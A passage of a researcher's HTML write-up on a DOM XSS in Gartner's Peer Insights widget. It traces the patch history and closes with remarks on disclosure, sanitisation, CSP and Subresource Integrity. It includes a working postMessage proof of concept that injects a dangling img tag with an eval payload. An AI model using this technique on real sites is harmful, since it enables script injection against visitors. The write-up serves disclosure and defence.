+&gt;&gt;_validateString("abcd&lt;script&gt;&lt;/script&gt;")
+""
+
+&gt;&gt;_validateString("abcd&lt;hello world&gt;")
+""</code></pre>
+    <p>
+        However, when given a dangling HTML tag, the function returns the string argument as-is:
+    </p>
+    <pre><code class="language-plaintext">&gt;&gt;_validateString("abcd&lt;img src=x")
+"abcd&lt;img src=x"
+
+&gt;&gt;_validateString("abcd&lt;hello world")
+"abcd&lt;hello world"</code></pre>
+    <p>
+        Thus, we can give dangling HTML tags, and hope that a subsequent tag closes it for us.
+    </p>
+    <p>
+        For example, the "small" and "large" widgets took the <code>name</code> value from the message, passed it through <code>_validateString()</code>, and used it before another tag.
+    </p>
+    <p>
+        The relevant data path for the "small" widget was as follows:
+    </p>
+    <pre><code class="language-javascript">y = function(e) {
+    // [... SNIP ...]
+        if ("line" === t.size) L(e);
+        else if ("large" === t.size) {
+            // [... SNIP ...]
+        } else {
+            // Handle data for small widget using _()
+            _(e);
+        }
+}
+_ = function(e) {
+    // Generate HTML using C()
+    var i = C(e);
+    // Inject HTML into page
+    t.dataContainer.innerHTML = i.join("");
+    // [... SNIP ...]
+},
+
+C = function(e) {
+    var i = [],
+        // [... SNIP ...]
+        // Sanitise message's "name" value
+        s = _validateString(e.name),
+    return i.push(
+        // [... SNIP ...]
+        // Inject sanitised name value right before a closing h1 tag
+        i.push('&lt;h1 class="gartner-pi-h1"&gt;' + s + "&lt;/h1&gt;"),
+        // [... SNIP ...]
+    ), i;
+},</code></pre>
+
+    <p>
+        Large widgets used <code>C()</code> in a similar fashion.
+    </p>
+    <p>
+        And so the following, which again implements the race technique and uses <code>name</code> as the injection point using a dangling <code>img</code> tag, achieves DOM XSS on the demo site when executed in the F12 Developer Console of www.gartner.com
+    </p>
+    <pre><code class="language-javascript">function ding(w, m, ttl) {
+    w.postMessage(m, "*");
+    ttl > 0 && setTimeout(ding, 100, w, m, ttl - 1);
+}
+(function(){
+    if (!(new Set(["gcom.pdodev.aws.gartner.com", "gcom.pdoqa.aws.gartner.com", "gartner.com", "www.gartner.com"]).has((new URL(location.origin)).hostname))) {alert("Origin's hostname is not in the blessed set"); return;}
+    let payload = "alert(document.domain);";
+    let u = "https://justinsteven.github.io/gartnerpeerinsightsxssdemo/demo3.html";
+    let wid="OWMzM2QzN2EtNWUwYS0iRJRJFJFIRDgtNWQ4ZjgyNDIyMmY3";
+    // Note that we leave this img tag dangling so it doesn't get spiked by _validateString()
+    let badImg = `&lt;img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onload="eval(atob('${btoa(payload)}'))"`;
+    let w = window.open(u);
+    m = JSON.stringify({"widgetId": wid, "reviews": [], "name": badImg});
+    ding(w, m, 1000);})()</code></pre>
+
+    <h3>tl;dr</h3>
+    <p>
+        Despite this patch, consumers of the Gartner Peer Insights widget were still susceptible to XSS if an attacker "pivoted" through an XSS vulnerability in one of the four blessed websites.
+    </p>
+
+
+    <h2>Chapter Six - Final fixes (26 January 2023 and 2 February 2023)</h2>
+    <p>
+        Gartner published changes on 26 January 2023 and 2 February 2023. The February update swapped out a <code>parseInt()</code> for a <code>parseFloat()</code>. This is not security relevant as far as I can tell, so we'll just review the code as of 2 February 2023.
+    </p>
+    <p>
+        After beautifying, normalising and tidying the new code, the first key difference is as follows:
+    </p>
+    <pre><code class="language-diff">diff --git a/hunk3c.js b/hunk5c.js
+index a073191..3f511bb 100644
+--- a/hunk3c.js
++++ b/hunk5c.js
+@@ -1,3 +1,7 @@
+ a = function(e) {
+-    return e = e || {}, t.widget_id = e.widget_id, t.widget_id ? (t.size = !e.size || "small" !== e.size && "large" !== e.size && "line" !== e.size ? "small" : e.size, t.theme = !e.theme || "light" !== e.theme && "dark" !== e.theme ? "light" : e.theme, t.sourcingLink = e.sourcingLink || null, t.version = e.version || 1, e.container && e.container.nodeType && 1 === e.container.nodeType ? (t.container = e.container, d(), l(), T(), p(), void 0) : void s("Required: You must specify a DOM element for the widget to render in")) : void s("widget_id argument is required")
++    return load_dom_purify(), e = e || {}, t.widget_id = e.widget_id, t.widget_id ? (t.size = !e.size || "small" !== e.size && "large" !== e.size && "line" !== e.size ? "small" : e.size, t.theme = !e.theme || "light" !== e.theme && "dark" !== e.theme ? "light" : e.theme, t.sourcingLink = e.sourcingLink || null, t.version = e.version || 1, e.container && e.container.nodeType && 1 === e.container.nodeType ? (t.container = e.container, d(), l(), T(), p(), void 0) : void s("Required: You must specify a DOM element for the widget to render in")) : void s("widget_id argument is required")
++},
++load_dom_purify = function() {
++    var e = document.createElement("script");
++    e.setAttribute("src", "https://cdnjs.cloudflare.com/ajax/libs/dompurify/2.4.3/purify.min.js"), e.setAttribute("type", "text/javascript"), document.getElementsByTagName("head")[0].appendChild(e)
+ },</code></pre>
+    <p>
+        It's pulling in <a href="https://github.com/cure53/DOMPurify">DOMPurify</a>, a "DOM-only, super-fast, uber-tolerant XSS sanitizer for HTML, MathML and SVG."
+    </p>
+    <p>
+        The next key change is as follows:
+    </p>
+    <pre><code class="language-diff">diff --git a/hunk3d.js b/hunk5d.js
+index 784be04..3fa5ce9 100644
+--- a/hunk3d.js
++++ b/hunk5d.js
+@@ -1,3 +1,3 @@
+ l = function() {
+-    window.addEventListener("message", o, {once: !0})
++    window.addEventListener("message", o)
+ },</code></pre>
+    <p>
+        The one-shot <code>postMessage</code> handler is back to being a regular handler.
+    </p>
+    <p>
+        The final key change is:
+    </p>
+    <pre><code class="language-diff">diff --git a/hunk3e.js b/hunk5e.js
+index c1586a9..8f01a59 100644
+--- a/hunk3e.js
++++ b/hunk5e.js
+@@ -1,10 +1,17 @@
+ _validateNumber = function(e) {
+-    return Number.isNaN(e) ? 0 : e
+-},
+-_validateString = function(e) {
+-    if (!("string" == typeof e || e instanceof String)) return "";
+-    var t = (new DOMParser).parseFromString(e, "text/html");
+-    return Array.from(t.body.childNodes).some(function(e) {
+-        return 1 === e.nodeType
+-    }) ? "" : e
++    return e ? isNaN(e) ? 0 : parseFloat(e, 10) : 0
++},
++re_match_alphanum_slash = function(e) {
++    const t = /^[a-zA-Z0-9-\/]+$/;
++    return ("string" == typeof e || e instanceof String) && e.match(t) ? e : ""
++},
++re_match_alphanum = function(e) {
++    const t = /^[a-zA-Z0-9-]+$/;
++    return ("string" == typeof e || e instanceof String) && e.match(t) ? e : ""
++},
++sanitise = function(e) {
++    return "undefined" != typeof DOMPurify ? DOMPurify.sanitize(e) : sanitise_fallback(e)
++},
++sanitise_fallback = function(e) {
++    return e.replaceAll("&amp;", "&amp;amp;").replaceAll("&lt;", "&amp;lt;").replaceAll("&gt;", "&amp;gt;").replaceAll("/", "&amp;#x2F;").replaceAll("'", "&amp;#x27;").replaceAll('"', "&amp;quot;")
+ };</code></pre>
+    <p>
+        <code>_validateNumber()</code> now does a <code>parseFloat()</code> (it was briefly a <code>parseInt()</code> between 26 January 2023 and 2 February 2023) on the not-NaN number it returns, and <code>_validateString()</code> has been replaced by a variety of functions that do the following:
+    </p>
+    <ul>
+        <li>Returns the string if it only contains alphanum characters or dash, else returns empty string</li>
+        <li>Returns the string if it only contains alphanum characters, dash or slash, else returns empty string</li>
+        <li>Returns the string after it is fed through <code>DOMPurify.sanitize()</code> if it is loaded, else it returns the string with key characters having been HTML encoded (including <code>&lt;</code> and <code>&gt;</code>)</li>
+    </ul>
+    <p>
+        These new string functions are used to sanitise <code>postMessage</code> values before constructing the wads of HTML.
+    </p>
+    <p>
+        I think the new sanitisation approach successfully protects against XSS, but if you can find a way to bypass it, let me know!
+    </p>
+    <h2>Chapter Seven - Closing Thoughts</h2>
+    <h3>Public disclosure suppression via "surprise" private bug bounty programs</h3>
+    <p>
+        I have feelings about public disclosure vs. private bug bounty programs. They're a bit hard to put into words.
+    </p>
+    <p>
+        First of all, I believe that if you're doing security research in your own lab, and you're not sending <a href="https://www.ietf.org/rfc/rfc3514.txt">evil packets</a> to someone else's computer, then it's fair game. <a href="https://threatpost.com/oracle-cso-you-must-not-reverse-engineer-our-code/114220/">Some may disagree.</a>
+    </p>
+    <p>
+        If a company has a bug bounty program, and they invite you to send evil packets to their computers (e.g. company.com) and you find a bug, then I think you owe it to them to play by their rules. Especially if they're offering to pay you. If their rules are that they don't want you speaking publicly about the hacking you did to their computers, and them paying you is contingent on you agreeing to that, then agreeing is reasonable.
+    </p>
+    <p>
+        If you do hacking in your own lab to some software, and you find a bug, and you reach out to the vendor to say, "Hey, I think this can be made better, here's what I think you should do, and also whether you do something about it or not, I'll be publicly discussing this after a reasonable amount of time" then I think that <a href="https://en.wikipedia.org/wiki/Coordinated_vulnerability_disclosure">makes a lot of sense</a>.
+    </p>
+    <p>
+        If the company you reach out to then says, "Hey, we like your work. We like it so much we'll pay you for having done it. But only if you don't mention the work you did to anyone else" then I think that's uncool. If you agree to do so then that's fine, we've all gotta eat. But I think it's an awkward thing for the company to offer.
+    </p>
+    <h3>Input filtering/sanitisation vs. safe handling of data</h3>
+    <p>
+        I'm not generally a fan of input sanitisation. I'm especially not a fan of it when a company or some software gets owned, and the peanut gallery on Twitter and Hacker News be all like "WhY DiDN't THEY sanITise tHEIr inpUTs". It's easy to be a hindsight hero and throw out pithy one-size-fits-some solutions that run the risk of not being aggressive enough, or being too aggressive, or catering for the wrong context, or just straight up being bypassable. But I digress.
+    </p>
+    <p>
+        Recall that a slice of Gartner's original code was as follows:
+    </p>
+    <pre><code class="language-javascript">// [... SNIP ...]
+return i.push('&lt;div class="gartner-pi-gradient">&lt;/div>'),
+i.push('&lt;div class="gartner-pi-card"&gt;'),
+i.push('&lt;div class="gartner-pi-logo"&gt;&lt;/div&gt;'),
+i.push('&lt;div class="gartner-pi-header"&gt;'),
+i.push('&lt;h1 class="gartner-pi-h1"&gt;' + a + '&lt;/h1&gt;'),
+i.push('&lt;h2 class="gartner-pi-h2"&gt;' + d + '&lt;/h2&gt;'),
+i.push('&lt;/div&gt;'),
+i.push('&lt;div class="gartner-pi-stats"&gt;'),
+i.push('&lt;div class="gartner-pi-alignLeft"&gt;'),
+i.push('&lt;div class="gartner-pi-overall-rating"&gt;'),
+i.push('&lt;span class="gartner-pi-score"&gt;' + n + '&lt;/span&gt;'),
+i.push(k(n)),
+i.push('&lt;/div&gt;'),
+// [... SNIP ...]</code></pre>
+    <p>
+        My original suggestion to Gartner was not to do sanitisation, but to rethink the way that they populate elements within a website's DOM. Cobbling together a wad of HTML and throwing it into a div's <code>innerHTML</code> is, in my opinion, a quick and risky way of displaying dynamically constructed elements. It would be more work, but IMO more robust, to use JavaScript to create DOM elements, to set their attributes and their <code>innerText</code> values as needed, and to structure the elements within the page.
+    </p>
+    <p>
+        Gartner chose a sanitisation strategy, where they would attempt to cleanse message data before building the wads of HTML. The initial approach was sadly bypassable.
+    </p>
+    <p>
+        I stand by my original suggestion, but in the case that one really wants or really needs to do sanitisation of data before slamming it in to <code>innerHTML</code>, I would suggest:
+    </p>
+    <ul>
+        <li>Using <a href="https://github.com/cure53/DOMPurify">DOMPurify</a> and paying close attention to their <a href="https://github.com/cure53/DOMPurify/wiki/Security-Goals-&-Threat-Model">security notes</a> rather than hand-rolling a solution; and</li>
+        <li>Keeping an eye on the <a href="https://developer.mozilla.org/en-US/docs/Web/API/Element/setHTML">Element.setHTML()</a> experimental API, which isn't yet supported by all browsers but which looks like it'll give you browser-powered DOMPurify-like sanitisation for free</li>
+    </ul>
+    </p>
+    <h3>Supply chain risk</h3>
+    <p>
+        Introducing third-party code to your website's frontend introduces various performance, privacy and security risks.
+    </p>
+    <ul>
+        <li>
+            Vulnerabilities in front-end code can lead to XSS (see above)
+        </li>
+        <li>
+            A compromise of the third party can lead to tampering of the code (see <a href="https://web.archive.org/web/20180905032943/https://www.riskiq.com/blog/labs/magecart-ticketmaster-breach/">Magecart</a> and also <a href="https://blog.ryotak.me/post/cdnjs-remote-code-execution-en/">RyotaK's work on Cloudflare's cdnjs</a>)
+        </li>
+    </ul>
+    <p>
+        While this story only deals with the former, both are relevant when considering the risks of introducing third-party code to your frontend.
+    </p>
+    <h3>Mitigating controls</h3>
+    <p>
+        There are some controls one can consider to mitigate web security risks, including as they relate to third-party code.
+    </p>
+    <h4>Content Security Policy (CSP)</h4>
+    <p>
+        <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP">Content Security Policy</a> can mitigate XSS vulnerabilities. For example, <a href="https://www.veracode.com/awards/gartner-peer-insights-customer-choice">Veracode</a> instantiates the Peer Insights Widget but includes CSP controls, which at the time of writing are:
+    </p>
+
+    <pre style="white-space: pre-wrap"><code class="language-plaintext">content-security-policy: default-src 'self' play.vidyard.com; script-src 'self' 'unsafe-inline' *.googleapis.com *.marketo.net *.google-analytics.com  *.google.com *.linkedin.com  *.marketo.com play.vidyard.com  *.googletagmanager.com *.googleadservices.com *.mktoresp.com static.ads-twitter.com  *.twitter.com *.doubleclick.net api.company-target.com *.cloudfront.net *.newrelic.com bam.nr-data.net client.netmng.com js.bizographics.com s.swiftypecdn.com connect.facebook.net script.crazyegg.com *.amazonaws.com *.swiftype.com *.6sc.co *.jquery.com *.cookielaw.org *.onetrust.com *.techtarget.com *.driftt.com boards.greenhouse.io snap.licdn.com px.airpr.com tracking.intentsify.io js.adsrvr.org ads.avocet.io ads.avct.cloud ml314.com optanon.blob.core.windows.net unpkg.com mc.yandex.ru protect-us.mimecast.com *.veracode.com *.trustradius.com *.brighttalk.com widgets.peerspot.com analytics.bgalytics.com/veracode.com static.cloudflareinsights.com nexus.ensighten.com *.gartner.com d3js.org/d3.v5.min.js; object-src 'self'; style-src 'self' 'unsafe-inline' fonts.googleapis.com cdnjs.cloudflare.com *.marketo.com s.swiftypecdn.com tagmanager.google.com *.cookielaw.org *.veracode.com maxcdn.bootstrapcdn.com optanon.blob.core.windows.net pro.fontawesome.com *.trustradius.com *.gartner.com optimize.google.com; img-src 'self' data: * *.gstatic.com; media-src 'self' *.youtube.com js.driftqa.com js.driftt.com; frame-src 'self' *.youtube.com *.google.com *.facebook.com platform.twitter.com careers.lifeatca.com *.snapengage.com b.company-target.com app-abd.marketo.com *.doubleclick.net play.vidyard.com *.jquery.com *.cookielaw.org *.onetrust.com *.techtarget.com *.soundcloud.com *.slideshare.net  *.driftt.com boards.greenhouse.io insight.adsrvr.org match.adsrvr.org *.veracode.com *.marketo.com *.brighttalk.com d1eoo1tco6rr5e.cloudfront.net *.gartner.com; child-src 'self' *.youtube.com *.google.com *.facebook.com platform.twitter.com app-abd.marketo.com *.doubleclick.net play.vidyard.com *.jquery.com *.cookielaw.org *.onetrust.com *.soundcloud.com *.veracode.com blob:; font-src 'self' data: *; connect-src 'self' *.mktoresp.com *.marketo.com secure.adnxs.com api.company-target.com *.google-analytics.com s.swiftypecdn.com cdnjs.cloudflare.com *.googleapis.com *.googletagmanager.com com *.googleadservices.com sjs.bizographics.com *.ads-twitter.com fonts.gstatic.com connect.facebook.net caveracode.netmng.com munchkin.marketo.net analytics.twitter.com *.doubleclick.net *.google.com t.co *.company-target.com *.prod.bidr.io id.rlcdn.com *.facebook.com *.ads.linkedin.com *.6sc.co *.crazyegg.com *.swiftype.com *.jquery.com *.cookielaw.org *.onetrust.com *.techtarget.com *.vidyard.com *.linkedin.com *.gravatar.com play.vidyard.com secure.gravatar.com i1.wp.com js.driftt.com boards.greenhouse.io bam.nr-data.net mc.yandex.ru *.trustradius.com *.cloudfront.net collection.bgalytics.com 790-zkw-291.mktoutil.com info.veracode.com
+</code></pre>
+
+    <p>
+        This policy defeats the POC I chose to use. It prevents the use of eval which breaks the <code>&lt;img src=x onerror="..."&gt;</code> trick. The policy does allow unsafe-inline scripts, but <code>&lt;script&gt;</code> elements when set using <code>.innerHTML</code> will not execute. All of this is to say, Veracode's CSP prevented my naive attempts at exploitation, there might still be a way to get it to pop off, but the presence of CSP is doing its job in making exploitation more difficult (and perhaps impossible).
+    </p>
+    <p>
+        Then again... Allowing unsafe-inline scripts is dangerous, and at least some listed items (e.g. <code>*.cloudfront.net</code> and <code>*.amazonaws.com</code>) are on the <a href="https://publicsuffix.org/">Public Suffix List</a>, allowing anyone to host a blessed <code>.js</code> file there. It's not the best policy, but it gave me a hard time.
+    </p>
+    <h4>Subresource Integrity (SRI)</h4>
+    <p>
+        It's somewhat off-topic, but working through this bug made me think about SRI, so here goes.
+    </p>
+    <p>
+        <a href="https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity">Subresource Integrity</a> is an effective mitigating control for the "compromised third party or CDN" case. The webpage that sources off-site third-party code can specify the cryptographic hash that the file is expected to have, and if the hash doesn't match (e.g. because the file has been maliciously modified) it doesn't execute in the user's browser.
+    </p>
+    <p>
+        However, offering SRI as the third party, and using SRI as the consumer, presents a trade-off against the "vulnerabilities" case.
+    </p>
+    <ul>
+        <li>
+            <strong>No SRI</strong> - there's a vulnerability in the third-party code, and the third party patches it. The file is updated on the provider's end, your users start getting the new file, they're no longer at risk of front-end XSS attacks, happy days. But you're also at risk of an attacker who has compromised the third party. They could replace the file with malicious contents, and it'd behave identically to the "the vendor patched a bug" case. Your users start getting the new malicious file and it's game over.
+        </li>
+        <li>
+            <strong>Vendor offers SRI, you use it</strong> - you're no longer at risk of an attacker injecting malicious payloads into the third-party code with. But what if there's a vulnerability? The vendor has committed to offering SRI. They can't change the code without the hash breaking, which would cause all SRI-using consumers to start rejecting the new code altogether. The vendor will need to publish a new version, and you'll need to bump the version on your end and update the SRI hash. Basically, updates to the third-party code stop being invisible and automatic. Once a patch is published, you're a sitting duck, advertising to the world that you're consuming the old version.
+        </li>
+        <li>
+            <strong>Vendor doesn't offer SRI, you use it anyway</strong> - you compute the expected hash of the third-party code and use it as an SRI hash. The vendor doesn't know you're doing this (and they don't need to), everything works on your end and you're protected against malicious tampering. You're also "protected" against genuine updates and bug fixes - as soon as the vendor changes the code (and without an SRI commitment, they feel free to) the SRI hash will break and your visitors will stop accepting the code.
+        </li>
+    </ul>
+    <p>
+        I can't think of a universal solution in this trade off. The remote end can either fix bugs for you and you get protected for free <strong> and</strong> attackers can inject malicious payloads and you get them for free. Or you get neither. It's up to you to pick your poison.
+    </p>
+    <h4>Vendoring Code</h4>
+    <p>
+        Running parallel to the idea of SRI is the idea of vendoring third-party code. Rather than pointing your visitors to a third-party copy of the code and telling them "expect it to have this cryptographic hash else don't run it", you host a copy of the code yourself. This is how the <a href="https://justinsteven.github.io/gartnerpeerinsightsxssdemo/">intentionally vulnerable demo site</a> which has been referenced throughout this document works. I grabbed point-in-time copies of the widget source code and hosted them locally.
+    </p>
+    <p>
+        Vendoring the code protects you from the "tampering" attack against the third party host, but it also prevents you from getting vulnerability fixes for free. When the vendor updates their copy of the code, you need to re-grab it and update your local copy.
+    </p>
+    <p>
+        I didn't originally realise that some sites discussed in this document were vendoring the widget code. Gartner picked up on this, and shouldered the work of reaching out to them. Some websites updated their vendored copy of the code but DTEX has not, demonstrating the risk of vendoring code and having it go stale.
+    </p>
+    <h3>Hack the planet</h3>
+    <p>
+        Finally, there are many more vulnerabilities in third-party JavaScript code. Stay safe, and happy hacking!
+    </p>
+    <p>
+        <a href="https://twitter.com/justinsteven">justinsteven</a>
+    </p>
+</div>
+
+<script src="https://code.jquery.com/jquery-3.6.1.min.js" integrity="sha256-o88AwQnZB+VDvE9tvIXrMQaPlFFSUTR+nldQm1LuPXQ=" crossorigin="anonymous"></script>
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-OERcA2EqjJCMA+/3y+gxIOqMEjwtxJY7qPCqsdltbNJuaOe923+mo//f6V8Qbsw3" crossorigin="anonymous"></script>
+<!-- Gallery -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/lightbox2/2.8.2/js/lightbox.min.js" integrity="sha512-2eijldKanOxzK54tvbFXDe51IxCAjOyYdJsb+XIcKFyLNm6TCgkn9UuX5phDdgRAknmhkKtOTDnvdJaznQ6Mjg==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+
+<!-- Highlight -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.7.0/highlight.min.js" integrity="sha512-bgHRAiTjGrzHzLyKOnpFvaEpGzJet3z4tZnXGjpsCcqOnAH6VGUx9frc5bcIhKTVLEiCO6vEhNAgx5jtLUYrfA==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+<script>hljs.highlightAll();</script>
+</body>
+</html>
